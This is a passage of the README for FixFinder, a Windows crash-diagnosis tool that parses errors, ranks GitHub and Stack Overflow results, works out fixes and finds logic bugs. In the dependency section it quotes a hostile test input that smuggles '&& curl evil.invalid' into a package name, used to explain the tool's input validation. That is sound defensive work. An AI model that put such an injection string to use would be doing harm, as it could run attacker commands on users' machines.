a failed package download or a silent exit is asked again next time. **A result's linked patches
download together**, still spaced as GitHub's plain-download budget asks. GitHub's API calls stay one
at a time, because GitHub asks clients not to make them concurrently.

**C# checks skip MSBuild, and only once they have been shown to give the same answer.** `dotnet build
Program.cs` took about a second per check, almost none of it compiling. FixFinder now asks the SDK once
per file name for the exact compile it would run - a design-time build returns the compiler's arguments
without compiling - and then runs the SDK's own `csc` with them through the same compiler server, in
about a tenth of the time. Nothing is reconstructed by hand: the compiler, references, analyzers, source
generators, defines and warning settings are all the SDK's. Only the paths change, including the two
lines of the SDK's generated settings that name the file and its folder, and a diagnostic with no file
gets the `CSC : ` prefix MSBuild puts on it. The first two checks of each file name compile both ways
and must agree - the same exit code, the same errors in the same places, the same diagnostic lines -
before the direct compile is used alone; one disagreement sends that name back to `dotnet build` for the
rest of the session. A file with `#:` directives always uses `dotnet build`, and so does any build whose
compiler or arguments FixFinder does not recognise.

**Java and Go get the same treatment.** A javac process spent about 600 ms starting a Java virtual machine
to compile a small file in about 20. FixFinder now keeps one `java` from the same JDK running and hands
each check to `com.sun.tools.javac.Main` - the class the javac launcher itself runs - with the same
arguments, writing into a buffer in the character set javac's own error stream uses; compared byte for
byte against javac on the same files, the output was identical. The go command takes about a fifth of a
second to start on Windows before doing anything; `go build -n` prints its plan - the import
configuration, the exact `compile` and `link` commands - which depends only on the file's name, package
and imports, so it is asked for once per combination and the two tools are then run directly, with go
build's own rewriting of their output (`# command-line-arguments`, the folder shortened to `.`) done the
same way. Files with build constraints, cgo, `//go:embed` or `//go:debug`, plans whose cached packages
or tools have changed, and plans that import a package not built yet - which is every plan on a machine
whose build cache is empty, as CI's is - go back to `go build`; a plan refused for that reason is asked for
again on the next check, after go build has built what was missing. Both, like C#, compare against the usual way before they are
trusted. For every route, output containing anything outside ASCII is always checked the usual way, so a
difference in character sets can never change an answer.

**gcc and clang already know many of the answers**, and print them for a person to read: `'bool' is
defined in header '<stdbool.h>'`, `did you mean 'weight'?`. FixFinder builds with
`-fdiagnostics-parseable-fixits`, which prints the same answers again as exact edits - a file, a byte
range and the text to put there - and applies those rather than inferring anything.

**A C crash that prints nothing is located.** An access violation, a write past the end of an array
or a divide by zero on Windows ends in an exit code and silence. When that happens, FixFinder rebuilds
the program with AddressSanitizer, which ships with Visual Studio, runs it once more, and reports the
file and line: `stack-buffer-overflow` at `app.c:4`, `access-violation (a null pointer)` at `app.c:5`.
If the build had warned `'malloc' undefined`, that warning is the explanation - C assumed an `int` and
cut the 64-bit pointer in half - and adding `<stdlib.h>` is offered as the fix. A `printf` told to read
a number as a string - MSVC's `C4477`, gcc's `-Wformat` - is read the same way, and the conversion that
matches the argument is offered.

### What is still not fixed, and why

Seventeen of the 46 with MSVC, eighteen with gcc - and most of them are out of reach of any rule:

- **The error depends on the data, not the code.** `KeyError: 'banana'`, `IndexError`, `'NoneType'
  object has no attribute 'email'`, `NullPointerException`, `int("forty")`, dividing by zero, a missing
  file. The message says what went wrong, never what the program should have done instead. These still
  get search results, and a C crash still gets its location.
- **The fix needs a value nobody stated**: `missing return statement`, `not all code paths return a
  value`, `var total;`, `greet() missing 1 required positional argument`. A plain `int total;` read
  before it is set is offered `= 0`, in Java and C#, with the explanation saying to put the real starting
  value there if it is not 0.
- **The answer is genuinely ambiguous**: `printn`, above.
- **The fix is not an edit.** A script called `random.py` shadowing the standard library needs
  renaming, and `curl/curl.h` needs a library installed where the compiler looks.
- **There is nothing wrong to fix.** gcc knows `malloc` as a built-in, so without `<stdlib.h>` the
  program it builds simply works. Likewise `bool` without `<stdbool.h>` under C23, where `bool` is a
  keyword - which gcc 15 uses by default, and which is how the CI runner first reported this.

The construct programs left behind the same kinds of thing: `NullReferenceException`,
`KeyNotFoundException`, `NumberFormatException`, `ClassCastException` and dividing by zero, which are
about data; a `const` assigned to, too few arguments, a pointer used after `free`, which have no single
right edit; and a third-party header. Some C runs never reached an error at all, because Windows'
Application Control blocked the freshly built program - which is this machine, not the mistake.

The later-years programs left the same kinds of thing again: recursion with no base case, an abstract
class created, a lambda changing a local variable, `>` on a generic `T`, a `switch` on a string - each with
more than one reasonable fix. An abstract or interface method never written was on that list, and is now
written as a stub that throws until it is filled in, in C#, Java and C++: the signature is fixed by the
declaration, and only the body is left for you, which the stub says out loud.

**Some C and C++ mistakes never fail at all**: `gets`, a string longer than its array, a `malloc` without
its element size and a returned local array all ran to the end here. A program that runs fine is no longer
taken at its word. If the build warned about one of those - gcc's `gets` and `initializer-string ... is too
long`, MSVC's `C4172` and `C4045`, a `delete` for a `new[]` under `-Wmismatched-new-delete` - the warning is
treated as the error, and the answer says the program ran but was wrong. With no warning, a C or C++ program
that ran fine is rebuilt with AddressSanitizer and run once more, which catches the `malloc` too small for
what is written into it. MinGW's `scanf` still quietly refuses the null address that MSVC's crashes on, and
a mistake neither a warning nor the sanitizer notices is still not found - a real limit of finding bugs by
running the program.

C++ left the same kinds of thing: an abstract class created, a struct printed with no `operator<<`, `>` on
a template's type, a `switch` on a `std::string`, a `const` assigned to, a null pointer written through and
an exception thrown on purpose - each with more than one reasonable fix. Two more were MSVC's alone: an
uncaught exception and a thread never joined end its programs with a bare `0xC0000409` and nothing printed,
where g++'s runtime names what was thrown. The AddressSanitizer rebuild of a C++ program now compiles in one
more file of FixFinder's own, never yours: a terminate handler that prints what g++'s runtime prints -
`terminate called after throwing an instance of 'std::out_of_range'` and its `what()` - so MSVC's silent
ending is read by the same rules, and `.at(i)` past the end and `worker.join()` are fixed under both
compilers.

JavaScript and Go left the same two kinds. Data: a property of `undefined` or `null`, invalid JSON, a nil pointer,
dividing by zero, a type assertion that fails. And code wrong in more than one way: recursion with no base case, an
error thrown on purpose, browser code run in Node, `new` on an arrow function, `>` on a generic type, a channel closed
twice. `fmt.Printn` is as near to `Print` as to `Println`, so it is refused rather than guessed, and `console.lg` is
too short to guess from. `import` in a `.js` file never fails at all: Node 24 notices the module syntax and runs it.

### What checking caught

Seventeen things were wrong, and each was found by running real programs rather than by trusting tests
that passed:

- **gcc on Windows was not being read at all.** A drive letter is a colon, gcc's file pattern stopped
  at the first one, and every gcc error fell to the generic parser. It surfaced only because Strawberry
  Perl, installed for the Perl tests, puts MinGW gcc on PATH - which switched every C test from MSVC
  to gcc and made the MSVC-only checks skip in a few milliseconds, looking exactly like passes.
- **Every Python fix was refused, and four were let through unchecked.** Windows 11's default `python`
  is the Microsoft Store build, which cannot see files other programs write under LocalAppData, so
  `py_compile` could not find a single copy. Copies are now compiled in the temp folder, and a compiler
  that fails without saying why counts as having checked nothing.
- **A linker error names no file**, so a correct fix for `prinft` was shown as advice rather than as a
  fix. A local fix now carries the file it was checked against.
- **`0xC0000094`, integer divide by zero, was reported as "finished unhappily"** rather than as a
  crash, so it was never located.
- **A Java crash inside a List was blamed on the JDK.** A Java frame names a file, never a path, so
  `Preconditions.java:100` looked no less like the program's own code than `App.java:7`, came first, and
  the loop that ran past the end of the List was never looked at. The JDK's frames are now known by
  their class - `java.util.ArrayList.get`.
- **MSVC's C++ headers became the project.** `#include <iostream>` in a C file is reported from inside
  Visual Studio's own `yvals_core.h`, so its include folder was taken as the source root. Nothing under
  Visual Studio or the Windows Kits is the user's code now.
- **gcc says nothing about `printf("%s", 5)`** unless asked with `-Wformat`, and the program simply dies.
  FixFinder now asks, and applies gcc's own fix-it. When the rebuilt program is then blocked from running,
  the warning alone is taken as the explanation of the silent crash, as `'malloc' undefined` already was.
- **A fix that compiled could still be wrong.** For `int grid[][]`, the rule read the column count from
  `grid[0][0]` in a `printf` instead of from the array's declaration, and offered `grid[][0]`. MSVC refused
  it, but gcc - which allows a zero-length array as an extension - compiled it, so the compile check alone
  would have let it through. The count now comes only from a declaration, and 0 is refused outright.
- **The Microsoft Store Python's standard library looked like the user's code.** It lives under
  `WindowsApps`, so a `ValueError` raised inside `asyncio` was blamed on `runners.py`, and the folder holding
  it was taken as the project. Nothing under `WindowsApps` counts as user code now.
- **A misspelt `main` under MinGW named no file.** The linker's `undefined reference to 'WinMain'` comes from
  inside a library, gcc's parser did not recognise the line, and a generic parser won with `ld returned 1
  exit status`. The line is recognised now, and the function a letter from `main` is found in the project.
- **Reading that linker line let a wrong fix through.** gcc's own fix-it for `} elif (x == 1) {` is a
  semicolon: `elif (x == 1);` compiles, as a call to a function called `elif`, and fails only when it links.
  The linker's complaint had been unreadable, so the check used to refuse the change for an unexplained
  failure; once it could be read, it passed as one more error uncovered behind a syntax error. It is not
  one - a link error means the whole file compiled, so nothing was hidden - and a new link error now
  refuses the change. The C `elif` test caught it.
- **An uncaught C++ exception was reported as silence.** libstdc++ prints `terminate called after throwing an
  instance of 'std::out_of_range'` and the exception's own message, then exits 3 - and nothing recognised the
  line, so a program that said exactly what went wrong was reported as having failed without a word. It is
  read now, and an `.at(i)` one past the end is traced to the loop that asked for it.
- **g++'s own headers became the project.** `std::sort` on a `std::list` fails inside `bits/stl_algo.h`, and
  the folder holding it, under Strawberry, was taken as the source root - so the program's own call was never
  looked at. The standard library's headers count as the compiler's now, wherever it is installed, as MSVC's
  already did.
- **A Go program that would not build was reported as silence.** The Go compiler names no severity -
  `app.go:6:2: declared and not used: count` - and nothing read that shape, so every Go build error ended as having
  failed without a word. It is read now, every error in the build, with the lines that continue one.
- **A JavaScript syntax error pointed at Node's module loader.** The file never ran, so every frame in its stack was
  Node's own; the file and line were only in the line printed above the message, which is read now.
- **Two JavaScript errors were read as .NET's.** `Error: Cannot find module 'fss'` has no word in front of `Error` and
  lists who asked for the module before its stack, and `Reduce of empty array` starts its stack with
  `at Array.reduce (<anonymous>)`. Each stopped the Node parser, and the .NET parser - which also reads `at ...` lines -
  took the output instead.
- **A name misspelt twice on one line kept its second spelling.** The nearest-name rule changed only the use the
  compiler pointed at, so `sqr.side * sqr.side` still failed on the other, and the fix was refused. Every use on the
  line is changed now.

## Logic errors: programs that run and are wrong

A crash says where it happened. A program that prints 82 where 82.5 was right says nothing at all - and nobody else has
written about it, so there is nothing to search for. FixFinder finds these two ways, and neither involves a model: one
reads the code for mistakes that are wrong whatever the program was for, and the other compares the output with what the
person says it should be and searches for the change that makes it right.

### From the code alone

Some logic mistakes are visible in the code itself, because the code contradicts what it visibly sets out to do. These
are looked for in every program that runs to the end, in a program that never finishes (only a loop that cannot end),
and in a C or C++ program that crashes without a word (only a write into a string literal). A fix is offered the same
way as any other: made in a copy, compiled, and handed over as the corrected lines.

| | The mistake | The fix handed over |
|---|---|---|
| Python | a loop whose `if` and `else` both `return`, so it never looks past the first item | the `else` return, moved after the loop |
| | `total = 0` inside the loop that adds to `total` | set once, before the loop |
| | `def add(x, items=[])` that appends to `items` | `items=None`, and a new list made inside |
| | `name.upper()` or `sorted(values)` on a line of its own | `name = name.upper()`, `values = sorted(values)` |
| | `count is 1000`, `assert (x == 7, "message")`, `total == 0` as a statement | `==`, the brackets removed, `=` |
| | `while i < n:` with nothing inside changing `i` or `n` | `i += 1` at the end of the loop |
| Java, C#, C, C++ | `double average = sum / count` with two `int`s | `(double) sum / count` |
| | `for (...);` or `if (...);` in front of a block | the `;` removed |
| | the loop returning in both branches, `total = 0;` inside the loop, a `while` that never moves on (and in JavaScript) | as for Python |
| Java, C, C++, JavaScript | a `case` without `break`, whose next case overwrites what it set | `break;` |
| Java | `answer == "yes"` on Strings | `answer.equals("yes")` |
| Java, C#, JavaScript | `name.toUpperCase();` on a line of its own | `name = name.toUpperCase();` |
| C, C++ | `int sum;` added to before it is ever set; `char *s = "hello"; s[0] = 'H';` | `int sum = 0;`; `char s[] = "hello";` |
| | `answer == "yes"` on a `char` array or pointer | `strcmp(answer, "yes") == 0`, with `<string.h>` |
| C++ | `catch (std::exception e)`; `Animal* pet = new Dog(); delete pet;` with no virtual destructor | `const std::exception& e`; `virtual ~Animal()` |
| C, C++, JavaScript | `if (items = 0)`; `flags & 1 == 0` | `==` (`===` in JavaScript); `(flags & 1) == 0` |
| JavaScript | `numbers.sort()` on numbers; `for (var i ...)` with a callback inside; `.map(parseInt)` | `sort((a, b) => a - b)`; `let`; `.map(Number)` |

Each is written to stay quiet when unsure, because a check that fires on correct code teaches people to ignore it:
`name.upper()` is flagged only when `name` certainly holds text, a mutable default only when the function changes it, a
`while` only when nothing inside it - no assignment, `break`, `return` or change to the bound - could end it, and a
fall-through only when the next case overwrites what this one set and no comment says it was meant.

### From the output it should have printed

For everything else, only the person knows what right is. **What it should print** goes in the box beside the input,
and **+ Add another run** adds more, each with its own input. A program that runs to the end is then compared with it
line by line - ignoring nothing but spaces at the end of a line and blank lines at the end, so `5.0` is not `5`. A prompt
counts: `input("Name: ")` prints `Name: ` in front of whatever comes next.

When a run is wrong, the change that makes every run right is searched for:

1. **Where.** Each run is repeated with the language's own coverage switched on, recording which lines it executed -
   Python's tracing hook, V8's coverage for Node, gcc's `--coverage` read back with gcov, and Go's `-cover`. Every line
   is then scored with **spectrum-based fault localisation**: the Ochiai formula, *ef / √(F × (ef + ep))*, where *ef* is
   how many wrong runs executed the line, *ep* how many right runs did, and *F* how many runs were wrong. A line only the
   wrong runs go through scores 1; a line every run goes through scores less the more right runs there are. DStar,
   *ef² / (ep + F − ef)*, breaks Ochiai's ties, and Tarantula is worked out alongside. Java and C# have no coverage without
   installing something, so for them every line counts as equally suspect.
2. **What.** On the most suspicious lines, the single-token edits behind most one-line logic fixes are generated: a
   comparison off by one (`<` for `<=` - tried first where it decides a loop or a branch), a bound off by one (a `- 1` too
   many or too few), the wrong arithmetic or logical operator (`//` for `/`, `or` for `and`), an integer division where a
   real one was meant, a constant one away, `min` for `max`, `True` for `False`. After those, an `if` / `elif` chain with
   a later branch moved to the front - a chain stops at the first true condition, so a special case tested after a more
   general one never gets its turn - and the same edit on two to four nearby lines together, for a mistake made twice.
   Across all those lines at once, the most suspicious line goes first and, on equally suspicious lines, the likeliest
   kind of edit. The mistakes from the code alone are tried before any.
3. **Checked by running it.** Each change is made in a private copy of the program's folder in the temp directory, built
   and run with every input given, a few copies at a time. The first change after which every run prints exactly what
   was expected is the answer. The program's own folder is never touched, and the copies are deleted afterwards.

The answer is honest about what that proves: the first change found that makes *these* runs right, not a proof that the
program is right for every input. Another change could fit the same runs, which is why more runs - especially runs that go
wrong in different ways - make the answer better. Ordering matters for the same reason: tried line by line, an early
`count = 0` nudged to `count = 1` made "banana" and "tree" both come out right before the real mistake, a
`range(len(word) - 1)` two lines down, was ever reached. When nothing fits, the lines Ochiai ranked highest are named.

**Measured** the same way as everything else: 28 small programs, one logic mistake each - 14 that need the expected
output, 14 that the code shows by itself - across all seven languages. Before, every one of them ran "without a problem".

| | Programs | From the code alone | From the expected output | Fixed |
|---|---|---|---|---|
| Python | 13 | 5 of 5 | 8 of 8 | 13 |
| Java | 4 | 3 of 3 | 1 of 1 | 4 |
| C | 3 | 2 of 2 | 1 of 1 | 3 |
| C++ | 2 | 1 of 1 | 1 of 1 | 2 |
| C# | 2 | 1 of 1 | 1 of 1 | 2 |
| JavaScript | 3 | 2 of 2 | 1 of 1 | 3 |
| Go | 1 | - | 1 of 1 | 1 |

From the expected output: a binary search with `low < high`, an average with `//`, a leap year with `or` for `and`, a
factorial whose `range` stops one short, `min` for `max`, a Fahrenheit formula with `- 32` for `+ 32`, vowels counted with
`len(word) - 1`, a sum starting from index 1 in Java and Go, grade boundaries with `>` for `>=` on two lines at once, a
product starting from 0, `Math.Min` for `Math.Max` in C#, a JavaScript loop running to `<= names.length` - and FizzBuzz
with the `% 15` test after the `% 3` one, which was the last one left until branches could be reordered: no single token is
wrong there, the order is. When nothing fits, the lines Ochiai ranked highest are named instead.

Two things only showed up by running it this way. Tried line by line, the vowel counter's first passing change was `count = 1`
and the binary search's was `high = len(items)`, each right for the runs given and wrong in general; ordering every edit by
suspicion first and likelihood second found `range(len(word))` and `low <= high`. And a copy that Windows' Application Control
refused to start was reported as a program printing the wrong thing; a launch that never happened is now retried, and never
counted as an answer.

Each program is a live test - `LogicErrorTests` - along with the formulas, the comparison, the edits generated and every
pattern, each with a case it must leave alone.

## When the fix is not a patch

A missing package is one of the commonest errors in any language, and nothing in your code is
wrong when it happens - the environment is short of something. There is no file to edit, so
`FixTier.Dependency`, reserved from the start for exactly this shape of answer, carries a line to
copy instead of a diff.

This started as a Python-only answer, which meant nine languages could be *understood* and one
could be *helped*. Eleven ecosystems now answer it:

| Language | Reads | Hands you |
|---|---|---|
| Python | `No module named 'yaml'` | `<that python> -m pip install pyyaml` |
| Node | `Cannot find module 'express'` | `npm install express`, or yarn/pnpm/bun |
| Ruby | `cannot load such file -- nokogiri` | `gem install nokogiri`, or `bundle add` |
| Go | `no required module provides package …` | `go get github.com/gorilla/mux` |
| Rust | `can't find crate for 'serde'` | `cargo add serde` |
| .NET | `Could not load file or assembly 'X'` | `dotnet add package X` |
| Java | `ClassNotFoundException: org.apache…` | the `pom.xml` block, or the Gradle line |
| PHP | `Class "GuzzleHttp\Client" not found` | `composer require guzzlehttp/guzzle` |
| Perl | `Can't locate LWP/UserAgent.pm in @INC` | `cpanm LWP::UserAgent` |
| Dart | `Couldn't resolve the package 'http'` | `dart pub add http` |
| Lua | `module 'socket' not found` | `luarocks install socket` |

**Java and PHP hand over a snippet, not a command**, because neither is configured from a command
line - you edit `pom.xml` or `build.gradle`. That is a difference the copy button has to know
about, so the description travels with the text rather than being assumed; calling a block of XML
"the command that installs it" would be telling you to run it.

**Which package manager is read off the project, not guessed.** A `pnpm-lock.yaml` gets
`pnpm add`, a `Gemfile` gets `bundle add`, a `build.gradle` gets the Gradle line. Running npm in a
pnpm workspace produces a second, conflicting lockfile, which is a worse day than the missing
package was.

Three things that are not obvious:

- **The import name is not the package name**, often enough to matter. `yaml` comes from `pyyaml`,
  `cv2` from `opencv-python`, `PIL` from `pillow`, `bs4` from `beautifulsoup4`. Telling someone to
  run `pip install yaml` sends them to a package that is missing or, worse, squatted, so the
  mismatches are listed rather than guessed at. A submodule resolves to its distribution:
  `yaml.loader` still installs `pyyaml`.
- **It installs with the interpreter that actually crashed**, not with whichever `pip` is first on
  PATH. On a machine with several Pythons those are different environments, and installing into
  the wrong one produces the most confusing outcome available - a successful install and an
  unchanged error.
- **A name nobody can map produces nothing at all.** Java and PHP are the two where the error
  names a *class* and not a package, and there is no offline way to derive one from the other. A
  guessed Maven `groupId` or Composer vendor would not merely be wrong, it would not resolve - so
  an unmapped name is left to the search instead. The listed coordinates are hand-written.
- **The package name arrives from untrusted output.** A program can print anything on stderr,
  including a line shaped exactly like a missing-import error, so every ecosystem validates the
  name against its own anchored allow-list before it goes anywhere near a command line, and none
  accept a leading dash. Anything carrying a switch, a URL or a shell separator is refused
  outright rather than cleaned up.

That last one has a failure mode subtler than injection, and three of the six new ecosystems
shipped with it before it was caught by feeding hostile input through and *reading the output*
rather than trusting the refusal tests - which passed, because each case happened to fail
validation for an unrelated reason:

```
"...provides package github.com/x/y && curl evil.invalid"   ->   go get github.com/x/y
```

Nothing escapes: the trailing text is dropped, not run. The flaw is that a line the program made
up silently became a *different, plausible* line - and a suggestion that looks perfectly ordinary
is the one nobody checks. Stopping at the first space is what does it, so each pattern now reads
to a real terminator and lets validation refuse the whole thing. Go ends the path with `;`, Ruby
allows only its own `(LoadError)` suffix, and Java takes the rest of the line. Perl's frames
needed the same care for a different reason: it stringifies arguments as `HASH(0x55f1)`, and
brackets that nest made every real Carp trace parse as though a caller were the error.

Nothing here is ever run for you. The line is text to copy, so the worst case for a mis-read is a
command that does not work rather than one that does something.

### What was tried and rejected

Running the language's own fixer - `ruff --fix`, `eslint --fix`, `dotnet format` - sounds like it
belongs here and does not. Measured on a file that crashes with `NameError: name 'avarage' is not
defined`, `ruff --fix` removed two unused imports, reported *"no fixes available"* for the
undefined name, and left the crash exactly as it was. Those tools fix lint, not crashes; wiring
one in would mean FixFinder edits your code and the program still fails. `cargo fix` is the real
exception, because it applies rustc's own machine-applicable suggestions - which is the same idea
as reading a runtime's `Did you mean`, already covered above.

## What it can and cannot do

FixFinder searches GitHub Issues and Stack Overflow. Those are mostly **prose**, so results
arrive in two tiers:

| Tier | Source | What happens |
|---|---|---|
| **A — a real patch** | Unified diffs found in GitHub issue/PR bodies, and linked commits fetched as `.patch` | Parsed, path-mapped, and handed over as the corrected lines |
| **B — advisory** | Everything else, including every Stack Overflow answer | Shown with the relevant code block. Never written to disk |

Three things are worth knowing before you use it:

- **Tier A is usually empty, and that is the tool working correctly.** A diff from a stranger's
  repo, at a different version, mapped onto your source tree and applying with exact context is
  a rare alignment. `0 auto-appliable, 6 advisory` is the normal result.
- **Web search only helps for third-party errors.** The most common real crash is a
  `NullReferenceException` in your own method, and no issue or answer exists for that. FixFinder
  detects when the culprit frame is your own code and says so instead of listing 30 irrelevant
  links. For the mistakes whose message pins the answer down, it works the fix out from the file
  instead - see [Fixes worked out from your code](#fixes-worked-out-from-your-code).
- **A patch harvested from an issue comment is untrusted input.** Every file a patch touches
  must resolve inside the source root you picked, and must appear in the parsed stack trace,
  or it is refused.

## Consent

One gate, and it is about running a program rather than about writing to one: **before anything
is launched**, a confirmation names the exact command line and working directory. A compiled
language runs two commands and the confirmation names both, because showing only the second would
be describing something other than what is about to happen.

The window opens without a notice first. There used to be two - `run-fixfinder.cmd` asking for
YES to be typed, and a blocking message box listing what the tool could do - carried over from the
tool FixFinder was modelled on. They described capabilities it no longer has, and asked the same
question the confirmation above asks at the moment it matters. What FixFinder sends, and where, is
set out in Settings.

There used to be another - a preview, a dry-run tick and the word APPLY typed in full - guarding
the moment FixFinder wrote to your source. It is gone because the writing is gone. Nothing here
modifies your files, so there is nothing left to guard; the fix goes to the clipboard and the
decision to paste it is made in your editor, where you can see what you are replacing.

## Layout

| Project | Target | Why |
|---|---|---|
| `FixFinder.Core` | `net8.0` | All the logic. Deliberately *not* `net8.0-windows` — it makes a `MessageBox` in a stack-trace parser impossible and lets the tests run headless |
| `FixFinder.Gui` | `net8.0-windows`, WPF | The only project that knows about WPF |
| `FixFinder.Tests` | `net8.0`, xUnit | Parsers, fingerprinting, diff parsing, patch application, ranking |
| `TestTargets` | — | Deliberately crashing programs to point it at |

One NuGet dependency in total: `System.Security.Cryptography.ProtectedData`, used to encrypt
the optional GitHub token at rest.

## Build and run

```
dotnet build FixFinder.Gui\FixFinder.Gui.csproj
dotnet test  FixFinder.Tests\FixFinder.Tests.csproj
```

### As a single executable

```
powershell -ExecutionPolicy Bypass -File publish-exe.ps1
```

Produces one signed `publish\FixFinder.exe` (~63 MB) with the .NET runtime and WPF bundled
inside, so it runs on a machine with no .NET installed. Double-click it; there is nothing else
to copy. Add `-FrameworkDependent` for a far smaller exe that needs the .NET 8 desktop runtime
already present.

It writes its `Logs\` folder beside itself, so keep it somewhere writable rather than in
`Program Files`.

The icon is drawn by `FixFinder.Gui\Assets\make-icon.py`, which is kept next to the `.ico` it
produces so the design stays editable rather than being an opaque binary. Every size in the file
is drawn at its own scale rather than shrunk from one large image - downscaling a 256px drawing
to 16px turns a thin ring into grey mush, and 16px is the size that appears in the taskbar.

**Whether it launches varies from build to build, and that is the honest account.** The exe is
signed with a local self-signed certificate, which satisfies the Application Control policy - but
Smart App Control judges by *reputation*, not by signature, and reputation attaches to the exact
bytes. Every republish produces a binary Windows has never seen, so one build starts and the next
is refused with *"An Application Control policy has blocked this file"*. Both have happened here.

`run-fixfinder.cmd` is the reliable way in when the exe is refused: it launches the DLL through
`dotnet.exe`, which Windows already trusts. Reliable is not the same as guaranteed - on this machine
Smart App Control has also refused a freshly rebuilt, signed DLL started through `dotnet`, and let it
load only once a change to its source gave it bytes it had not seen before.

### From the build output

Launch it with `run-fixfinder.cmd`, or directly:

```
dotnet FixFinder.Gui\bin\Debug\net8.0-windows\FixFinder.Gui.dll
```

**The Debug build runs through `dotnet`, never as a raw `.exe`.** This machine's Application
Control policy blocks a freshly-built, unsigned binary under the user profile with
`0x800711C7`; `dotnet.exe` is already trusted. Each `.csproj` self-signs its Debug output via
`..\sign-for-wdac.ps1` so the DLL itself loads, and that script is a no-op on a machine with no
code-signing certificate, such as CI. It signs with the newest one in your personal store, or the
one named by the `FIXFINDER_CERT_SUBJECT` environment variable.

The published single-file exe is a different case, and this section previously claimed it had
been measured to run here. It had been - once - and that turned out to be a fact about one build
rather than about the exe. A later republish was blocked outright. Reputation is per-binary, so a
single successful launch proves nothing about the next one, and the claim has been corrected
rather than quietly dropped.

## Searching, and what it costs

Two sources, and they are not equivalent:

| | Stack Overflow | GitHub |
|---|---|---|
| Tier | **Always advisory** — answers are prose, never diffs | The only source that can yield an appliable patch |
| Cost per search | 2 requests, whatever the result count | 1 search, plus 1 per issue whose timeline is followed (top 5) |
| Allowance | 300/day per IP, 10,000 with a free key | Search **10/min**, everything else **60/hour** — two separate pools |

Those two GitHub pools behave nothing alike, and FixFinder meters them separately. Search
refills every minute, so searching is comfortable; the hourly pool is the one that actually
runs out, and following an issue's timeline is what spends it.

A fine-grained GitHub token **with no permissions selected at all** raises search to 30/min and
the hourly pool to 5000. FixFinder only reads public data, so anything more is unnecessary —
do not paste a token with `repo` access. Tokens are encrypted with DPAPI under your account and
are never logged, never echoed back into their box, and never put in a URL.

**Cached results only** answers every request from responses already stored on this machine and
makes no network request whatsoever — a miss is reported as a miss rather than quietly fetched.
The cache is plain JSON under `%LOCALAPPDATA%\FixFinder\cache`, one readable file per request,
with any credential stripped out of the URL before it is hashed or written.

Both queries are shown and **editable** before anything is sent. With no model in the loop,
typing better words yourself is the single most effective thing available.

## How candidates are ordered

Both services return thirty results apiece, ordered by their own idea of relevance across the
whole site. Ordering them by how well they match *this* crash is what separates FixFinder from
a link dump.

| Signal | Weight | What it measures |
|---|---|---|
| Type match | 0.30 | Does it name this exception type or error code |
| Message similarity | 0.22 | Weighted overlap with the error's distinctive words |
| Title containment | 0.10 | How much of the query is in the title |
| Resolution | 0.10 | Accepted answer, closed with a commit, or still arguing |
| Authority | 0.08 | Votes and reactions, on a saturating log scale |
| Recency | 0.06 | Decays over roughly three years |
| Language match | 0.06 | Tagged for the language that actually crashed |
| Patch available | 0.08 | A linked commit or pull request exists |

Penalties: **−25** the text never mentions the exception type · **−15** nobody replied ·
**−10** closed as a duplicate · **−20** written before a break in the ecosystem that makes the
advice wrong rather than merely dated.

Three rules matter more than the weights:

- **A match in the title counts for more than a match in the body.** A title says what a post is
  about; a body contains whatever anyone pasted into it. Without this, one incidental stack
  trace inside a long security audit scores as highly as a question titled with your error.
- **Carrying a patch does not float a poor match to the top.** A weakly-matched diff that
  happens to apply cleanly is more dangerous than an obviously irrelevant one, so a patch only
  leads once the candidate has independently scored 55 or better.
- **Votes saturate.** A five-thousand-vote answer to a vaguely similar question must not outrank
  a twelve-vote answer describing exactly this failure.

Nothing here is learned or fitted. Every number is fixed, written down, and rendered line by
line in the detail pane, so "why is this one first" is always answerable — which is also how
the weights get tuned.

## Handing the fix over

**FixFinder does not write to your files.** It finds the fix, shows it, and puts it on the
clipboard; you paste it. That is a narrower promise than applying, and a far easier one to keep -
the whole apparatus of source roots, containment, exact-context matching, backups, rollback and
verify-by-rerun existed to make writing safe, and not writing is safer still.

It also removes the limit that mattered most in practice. A patch that cannot be *applied* to your
tree - because it was written against another version, or another project, or a library installed
outside your project - can always be *read*. Everything found is now usable, where before most of
it was shown with a greyed-out button.

**The clipboard never gets a diff.** This is the part worth stating plainly, because it is the
one thing that would make the feature useless. A unified diff is written for a machine: the `+`
and `-` markers, the `@@` header and the removed lines are instructions, and pasting them into a
source file produces something that does not compile. What is copied is the code as it should end
up - the new side of the hunk, context lines included, so the block replaces the old one exactly:

```
 def read_user(payload):        ->    def read_user(payload):
-    return payload["user_id"]            return payload.get("user_id")
+    return payload.get(...)          print("done")
 print("done")
```

The window says where it goes - *"Copied 3 lines - paste over cart.py, from line 42"* - so the
block can be lined up without counting.

Three shapes, three sensible answers:

| What was found | What gets copied |
|---|---|
| A patch, from GitHub or from the runtime's own suggestion | the corrected lines, markers stripped |
| A missing package | the install command, to paste into a terminal |
| A prose answer | its code block, as the author wrote it |

Hunks that are not contiguous are kept apart with a marker rather than run together, because
pasting them as one block would silently delete every line between them.

## Status

Built in milestones, each one runnable on its own.

- [x] **M0** — projects, WDAC signing, consent chain (since reduced to the pre-launch confirmation), steps 1–3 laid out
- [x] **M1** — launch a target and watch its stdout/stderr live
- [x] **M2** — stack-trace parsers, fingerprinting, source-root detection
- [x] **M3** — GitHub and Stack Overflow search, caching, quota, token storage
- [x] **M4** — ranking and the candidate list *(the point at which it is genuinely useful)*
- [x] **M5** — diff parsing and read-only patch preview
- [x] **M6** — patch application, backups, typed-`APPLY` gate
- [x] **M7** — build, re-run, verify, auto-rollback

## Licence

MIT. See [LICENSE](LICENSE).
